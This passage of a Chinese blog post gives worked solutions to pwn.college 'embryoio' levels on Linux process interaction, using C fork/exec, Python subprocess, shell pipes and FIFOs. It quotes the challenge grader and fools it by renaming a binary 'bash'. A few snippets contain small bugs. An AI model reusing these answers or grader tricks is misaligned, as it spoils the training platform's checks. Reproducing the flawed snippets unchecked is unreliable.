class="hljs-comment">#注意open的参数为w是写入，否则什么信息都没有</span><br><span class="hljs-comment"># 环境变量为空</span><br>subprocess.run(<span class="hljs-string">&quot;/challenge/embryoio_level21&quot;</span>,<span class="hljs-built_in">env</span>=&#123;&#125;)  <span class="hljs-comment">#这里&#123;&#125;也可以用dict()</span><br></code></pre></td></tr></table></figure><h2 id="level-32"><a class="markdownIt-Anchor" href="#level-32"></a> level 32</h2><blockquote><p>这里就是使用c编译生成二进制文件，用fork()子进程来执行程序</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># vim中替换数字</span><br>:%s/31/32/g<br></code></pre></td></tr></table></figure><p>类似如下格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span>&#123;<br>        <span class="hljs-type">pid_t</span> pid = fork();<br>        <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<br>        execl(<span class="hljs-string">&quot;/challenge/embryoio_level29&quot;</span>,<span class="hljs-string">&quot;embryoio_level29&quot;</span>,<span class="hljs-literal">NULL</span>)<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            waitpid(pid,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="level-41"><a class="markdownIt-Anchor" href="#level-41"></a> level 41</h2><blockquote><p>对于rev的使用，看了半天discord中两个人在level40下的对话，了解到ctrl+d被用作终端的文件结束符，能结束rev的数据接收</p></blockquote><ul><li>ctrl+c<ul><li>通常用于中断当前正在运行的进程，发送一个中断信号给当前正在前台运行的进程，导致该进程终止。这是强制性的中断信号</li></ul></li><li>ctrl+d<ul><li>通常用于表示输入的结束，即文件结束符。按下ctrl+d，终端将认为您已经完成输入，也可以用于退出交互式shell</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcz@LAPTOP-46SOH5O1:/mnt/c/Users/NU/Desktop$ <span class="hljs-built_in">cat</span>  <span class="hljs-comment"># ctrl+c</span><br>jdklasjd<br>jdklasjd<br>^C<br>tcz@LAPTOP-46SOH5O1:/mnt/c/Users/NU/Desktop$ <span class="hljs-built_in">cat</span>  <span class="hljs-comment"># ctrl+d</span><br>djaklsjdlak<br>djaklsjdlak<br>jdkaljdalk<br>jdkaljdalk<br></code></pre></td></tr></table></figure><ul><li>wp</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rev | /challenge/embryoio_level41<br><span class="hljs-comment"># 之后逆序输入随机数，然后使用ctrl+d结束rev的输入，然后rev的输出作为输入到可执行文件中</span><br></code></pre></td></tr></table></figure><h2 id="level-44"><a class="markdownIt-Anchor" href="#level-44"></a> level 44</h2><blockquote><p>sed b --&gt;  b label  Branch to label; if label is omitted, branch to end of script.</p><p>这里就是直接省略标签，然后跳转到末尾，这样就全部显示出标准输出了</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash tmp.sh<br><br><span class="hljs-comment"># tmp.sh</span><br>/challenge/embryoio_level44 | sed b<br></code></pre></td></tr></table></figure><h2 id="level-48"><a class="markdownIt-Anchor" href="#level-48"></a> level 48</h2><blockquote><p>使用ipython来实现管道[Popen的使用](<a href="https://blog.csdn.net/qq_34355232/article/details/87709418">python中的subprocess.Popen()使用_with subprocess.popen-CSDN博客</a>)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br>p1 = subprocess.Popen([<span class="hljs-string">&quot;/challenge/embryoio_level48&quot;</span>], stdout=subprocess.PIPE, shell=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># subprocess.PIPE为管道</span><br>p2 = subprocess.Popen([<span class="hljs-string">&quot;cat&quot;</span>], stdin=p1.stdout, stdout=subprocess.PIPE, shell=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># shell为False时，Popen使用os.execvp()来执行子程序，这时执行的命令不会在Shell中执行，满足题目要求。但是参数args[]，必须是字符串形式传递，比如[&quot;cat&quot;,&quot;flag.txt&quot;]可以使用，但是[&quot;cat flag.txt&quot;]不可以使用，它需要shell=True</span><br><span class="hljs-built_in">print</span>(p2.communicate()[<span class="hljs-number">0</span>])，<br><span class="hljs-comment"># 这里返回元组(stdout_data, stderr_data)，这里就是获取p2的标准输出</span><br><br><span class="hljs-comment"># ipython中运行 %run *.py</span><br></code></pre></td></tr></table></figure><h2 id="level-59"><a class="markdownIt-Anchor" href="#level-59"></a> level 59</h2><blockquote><p>主要就是对于rev的处理</p></blockquote><h2 id="level-60"><a class="markdownIt-Anchor" href="#level-60"></a> level 60</h2><blockquote><p><a href="https://book.itheima.net/course/223/1277519158031949826/1277528240394608641">匿名管道</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"># 提示 - the challenge checks <span class="hljs-keyword">for</span> a specific process at the other end of <span class="hljs-built_in">stdout</span> : cat<br># 这里就是需要将 embryoio_level60 的输出传递到 cat 中<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br>    pipe(fd);<span class="hljs-comment">//注意管道的建立必须在父子进程建立之前，否则它们不会共用管道</span><br>    <span class="hljs-type">int</span> pid = fork();<br>    <br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<span class="hljs-comment">//子进程</span><br>    &#123;<br>        close(fd[<span class="hljs-number">0</span>]);<span class="hljs-comment">//关闭管道的读，使管道只能被写入，便于下面写入管道</span><br>        dup2(fd[<span class="hljs-number">1</span>], STDOUT_FILENO);<span class="hljs-comment">//dup2将标准输出(STDOUT_FILENO)重定向到管道的写入端 fd[1]。这样下面的输出将不再是默认终端输出，而是写入管道中</span><br>        execl(<span class="hljs-string">&quot;/challenge/embryoio_level60&quot;</span>, <span class="hljs-string">&quot;embryoio_level60&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><span class="hljs-comment">//父进程</span><br>    &#123;<br>        <span class="hljs-type">int</span> fpid = fork();<br>        <span class="hljs-keyword">if</span> (fpid == <span class="hljs-number">0</span>)<br>        &#123;<br>            close(fd[<span class="hljs-number">1</span>]);<span class="hljs-comment">//关闭管道写，同上</span><br>            dup2(fd[<span class="hljs-number">0</span>], STDIN_FILENO);<span class="hljs-comment">//dup2将标准输入(STDIN_FILENO)重定向到管道的读取端 fd[0]，则下面cat的输入就不是来自默认终端输入，而是从管道中读取</span><br>            execl(<span class="hljs-string">&quot;/usr/bin/cat&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            wait(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​通过这样的重定向，子进程1的输出会成为子进程2的输入，实现了进程之间的管道通信。在这个具体的例子中，子进程1执行的程序是 <code>/challenge/embryoio_level60</code>，它的输出通过管道传递给子进程2，而子进程2执行的程序是 <code>/usr/bin/cat</code>，将管道的内容输出到标准输出。</p><h2 id="level-66"><a class="markdownIt-Anchor" href="#level-66"></a> level 66</h2><blockquote><p>注意find的命令格式</p><p>find path -option 【-print】 【-exec -ok | xargs | grep】 【command {} ;】</p><p><a href="https://blog.csdn.net/l_liangkk/article/details/81294260">Linux下find命令详解</a></p></blockquote><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/challenge/</span>embryoio_level66 -exec <span class="hljs-regexp">/challenge/</span>embryoio_level66 &#123;&#125; \;<br></code></pre></td></tr></table></figure><h2 id="level-68"><a class="markdownIt-Anchor" href="#level-68"></a> level 68</h2><blockquote><p>这里就是使用printf打印多个参数</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">/challenge/embryoio_level68 $(printf &#x27; oychnztsoh%0.s&#x27; &#123;1..307&#125;)<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">printf</span> 是一个格式化输出的命令，用于按照指定格式打印文本。</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">&#x27; oychnztsoh%0.s&#x27;</span> 是 <span class="hljs-built_in">printf</span> 的格式字符串。其中 %0.s 是一个格式说明符，表示输出一个宽度为0的字符串，这里主要是为了生成 307 次输出而不添加额外的字符，只输出 <span class="hljs-string">&quot; oychnztsoh&quot;</span> 这个字符串。前面有一个空格就是为了分隔开不同的参数，否则就连在一起成为一个参数了</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&#123;1..307&#125; 是 Bash shell 中的一种用法，表示一个整数序列，从1到307。这里使用这个序列来让 <span class="hljs-built_in">printf</span> 命令打印 307 个 <span class="hljs-string">&quot; godxqtxpvg&quot;</span> 字符串。</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">最后作为参数给特定程序</span><br></code></pre></td></tr></table></figure><h2 id="level-70-71"><a class="markdownIt-Anchor" href="#level-70-71"></a> level 70-71</h2><blockquote><p>使用c程序的execv来伪造shell脚本运行</p></blockquote><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 如下为题目要求</span><br><span class="hljs-comment"># 使用shell脚本来运行程序</span><br>- the challenge checks <span class="hljs-keyword">for</span> a specific parent process : shellscript<br><span class="hljs-comment"># 程序在执行时的环境变量是空的，即程序执行时，只能有系统默认的一些环境变量，不能存在自己设置的。反应到C程序中，就是argc要求为0，shell脚本就是 env -i /target_file 来执行程序</span><br>- the challenge will check that the environment is empty (except LC_CTYPE, <span class="hljs-built_in">which</span> is impossible to get rid of <span class="hljs-keyword">in</span> some cases)<br><span class="hljs-comment"># 这里要求argv参数的固定位置存在指定字符串，这里c中使用execve等来处理，shell脚本可以使用 printf 来生成多个字符放在执行程序的参数位置</span><br>- the challenge will check that argv[NUM] holds value VALUE (listed to the right as NUM:VALUE) : 266:uxzdewxjpd<br><span class="hljs-comment"># 这里就是要求环境变量，c中也可以用execve来处理，shell中使用export或者直接赋值，但是这里变量名是用数字来命名的，系统又不允许这样(我没找到具体的实现方法，按理来说c可以这样搞，依赖系统调用的应该也能搞，空闲分析一下c的execve函数)</span><br>- the challenge will check that <span class="hljs-built_in">env</span>[KEY] holds value VALUE (listed to the right as KEY:VALUE) : 178:lohijbkutd<br></code></pre></td></tr></table></figure><p>​由于checker.py函数只是检测命令执行的文件名，第一个bash检测就是检测运行的程序名为<code>bash</code>即可，第二个检测是bash加一个结尾为<code>.sh</code>的参数即可。所以这里就把自己编写的c语言程序改名为bash，然后加个不适用的参数<code>a.sh</code> 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bash</span>(<span class="hljs-params">process</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then,&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] most likely, this is what you do by default anyways, but we&#x27;ll check just in case...&quot;</span>)<br>    check_exe_basename(process, <span class="hljs-string">&#x27;bash&#x27;</span>)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(process.cmdline()) == <span class="hljs-number">1</span>, <span class="hljs-string">f&quot;The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: <span class="hljs-subst">&#123;process.cmdline()&#125;</span>&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_shellscript</span>(<span class="hljs-params">process</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] Checking to make sure the process is a non-interactive shell script.&quot;</span>)<br><br>    <span class="hljs-keyword">assert</span> os.path.basename(process.exe()) <span class="hljs-keyword">in</span> [ <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span> ], <span class="hljs-string">f&quot;Process interpreter must be &#x27;sh&#x27; or &#x27;bash&#x27;. Yours is: <span class="hljs-subst">&#123;os.path.basename(process.exe())&#125;</span>&quot;</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(process.cmdline()) == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> process.cmdline()[<span class="hljs-number">1</span>].endswith(<span class="hljs-string">&quot;.sh&quot;</span>), <span class="hljs-string">f&quot;The shell process must be executing a shell script that you wrote like this: `bash my_script.sh`&quot;</span><br></code></pre></td></tr></table></figure><p>​同时 <code>execve</code> 并不会创建一个新的进程，而是替换当前进程的内容。但是这里需要使用子进程来执行 <code>execve</code> 函数，因为父进程必须为bash，这里就是通过父进程名为bash，子进程执行来通过检测。可以参照 <code>level 1</code> 的 exp3，通过父进程名称为 <code>bash</code> 的检测，然后再由 <code>a.sh</code> 的参数伪造(不执行)，即可通过检测</p><p>​但是测试只使用 main 来运行 execve 替换进程就不成功。这里感觉还是参数的问题，直接替换的话，后面紧跟的 <code>.sh</code> 应该就识别不到了(还是有点糊涂)</p><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-type">char</span>* env[] = &#123;<span class="hljs-string">&quot;178=lohijbkutd&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<span class="hljs-comment">//设置environment variable 178</span><br>        <span class="hljs-type">char</span>* argv[<span class="hljs-number">268</span>] = &#123;<span class="hljs-string">&quot;embryoio_level71&quot;</span>&#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">267</span>; i ++)&#123;<span class="hljs-comment">//设置argv[266]，这里i的最大取值为266，比268小2，因为argv共268个元素，其中0为embryoio_level71，后面266个为uxzdewxjpd，最后要留一个元素为NULL，它自己赋值的，但是一定需要保留</span><br>            argv[i] = <span class="hljs-string">&quot;uxzdewxjpd&quot;</span>;<br>        &#125;<br>        execve(<span class="hljs-string">&quot;/challenge/embryoio_level71&quot;</span>, argv, env);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="level-72"><a class="markdownIt-Anchor" href="#level-72"></a> level 72</h2><blockquote><p>重定向输入可以从后面往前</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这里的重定向输入可以用小于号从后面往前面</span><br>- the challenge will check that input is redirected from a specific file path : dpgobq<br><span class="hljs-comment"># wp</span><br><span class="hljs-built_in">mkdir</span> /tmp/ntmizw;<span class="hljs-built_in">cd</span> /tmp/ntmizw;<span class="hljs-built_in">touch</span> dpgobq;bash /home/hacker/b.sh &lt; dpgobq<br></code></pre></td></tr></table></figure><h2 id="level-73"><a class="markdownIt-Anchor" href="#level-73"></a> level 73</h2><blockquote><p>这里依然注意对于父子进程的检查</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">需求</span><br>- the challenge checks for a specific parent process : shellscript<br>- the challenge will check that it is running in a specific current working directory : /tmp/svlava<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里就是说.sh和challenge的工作目录需要不同</span><br>- the challenge will check to make sure that the parent&#x27;s parent CWD to be different than the challenge&#x27;s CWD<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">b.sh</span><br>cd /tmp/svlava;exec /challenge/embryoio_level73<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">d.sh</span><br>bash b.sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">~目录执行的命令，-c表示将后面的字符串作为命令来执行</span><br>bash -c &quot;bash d.sh&quot;/bash d.sh(后面那种情况不知道为啥子突然就可以用了，可能之前每设置好，但是这种更容易理解)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">成功通过，返回结果</span><br>[INFO] My working directory is: /tmp/svlava.<br>[INFO] Parent working directory is: /home/hacker.<br></code></pre></td></tr></table></figure><p>​这里要求父进程为一个 <code>.sh</code> 文件，同时父进程的工作目录和 <code>/challenge/embryoio_level73</code> 的工作目录不同。</p><ul><li>对于 <code>exec</code> ，如果不使用这个，那么它重新开启一个新进程执行challenge，父进程 <code>b.sh</code> 的工作目录受cd影响，子进程的工作目录也一样在cd后的目录，所以不能通过检测。而如果使用 <code>exec</code> ，那么challenge替换掉 <a href="http://b.sh">b.sh</a>，它的父进程就是 <a href="http://d.sh">d.sh</a>，那么工作目录就不一样了</li><li>然后考虑在目录/home/hacker执行 <code>bash d.sh</code> ，它确保父进程 <code>d.sh</code> 的工作目录为/home/hacker，子进程 <code>b.sh/challenge</code>的工作目录为/tmp/svlava，满足了条件</li></ul><h2 id="level-74-77"><a class="markdownIt-Anchor" href="#level-74-77"></a> level 74-77</h2><blockquote><p>python中环境变量用os设置，参数可以直接设置</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess,os<br>args = [<span class="hljs-string">&quot;/challenge/embryoio_level77&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">203</span>):<br>    args.append(<span class="hljs-string">&quot;wysilgjbsx&quot;</span>)<br>os.environ.clear()<br>os.environ[<span class="hljs-string">&quot;118&quot;</span>] = <span class="hljs-string">&quot;beyqbsuxdc&quot;</span><br>subprocess.run(args)<br></code></pre></td></tr></table></figure><h2 id="level-79"><a class="markdownIt-Anchor" href="#level-79"></a> level 79</h2><blockquote><p>python中subprocess的子进程启动，这个比shell简单太多了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess,os<br><span class="hljs-comment"># os.mkdir(&quot;/tmp/wnufru&quot;)使用这个方法，父进程也移动了</span><br>os.chdir(<span class="hljs-string">&quot;/tmp/wnufru&quot;</span>)<br>args = [<span class="hljs-string">&quot;/challenge/embryoio_level79&quot;</span>]<br>subprocess.run(args, cwd = <span class="hljs-string">&quot;/tmp/wnufru&quot;</span>)<span class="hljs-comment"># 这里就是设置子进程的目录</span><br></code></pre></td></tr></table></figure><h2 id="level-86-87"><a class="markdownIt-Anchor" href="#level-86-87"></a> level 86-87</h2><blockquote><p>怎么说呢，这个意思就是让你写一个shell脚本，来计算它给出的表达式，感觉像写一个简易计算器，但是不会脚本，就直接手撸计算了，算是混过去的</p></blockquote><h2 id="level-88"><a class="markdownIt-Anchor" href="#level-88"></a> level 88</h2><blockquote><p>这里要求固定argv[0]，可以用之前c的歪路搞，但是shell可以使用链接来处理</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /challenge/embryoio_level88 /tmp/olrqmc <span class="hljs-comment">#创建链接</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <span class="hljs-comment">#添加/tmp到环境变量，确保搜索可执行文件时也会考虑当前目录</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/tmp/olrqmc&quot;</span> &gt; b.sh<br>bash b.sh <br></code></pre></td></tr></table></figure><h2 id="level-90"><a class="markdownIt-Anchor" href="#level-90"></a> level 90</h2><blockquote><p>要知道fifo是什么东西，以及它读写的性质</p></blockquote><p>​简单来说就是一个有实体的管道，创建时会以文件的形式出现在当前目录中，好像是单工通信，只能由一方传给另一方，而且如果没有消费者，生产者会阻塞等待，所以我们在运行时需要并发运行两个进程，不然会阻塞。</p><p>​也是这个题的原因，去真正了解了一下Linux中的管道机制，获得了很多知识，具体看 <code>Linux管道机制</code> 那篇博客，<a href="https://www.bilibili.com/video/BV1wc411x7zj/?spm_id_from=333.337.search-card.all.click&amp;vd_source=17ac9da9453dbd6d64b9616668574c5f">【管道】传统nc反弹shell语句解析_参考视频</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/challenge/embryoio_level90 &lt; tmp&#x27;</span> &gt; b.sh<br><span class="hljs-built_in">echo</span> ergtqvym &gt; tmp | bash b.sh<br></code></pre></td></tr></table></figure><h2 id="level-92"><a class="markdownIt-Anchor" href="#level-92"></a> level 92</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> tmp1<br><span class="hljs-built_in">mkfifo</span> tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;(/challenge/embryoio_level92 &lt; tmp1) &gt; tmp&#x27;</span> &gt; b.sh<br><span class="hljs-built_in">echo</span> hprrtwgz &gt; tmp1 | bash b.sh<br><span class="hljs-comment"># 然后另外起一个shell执行 cat 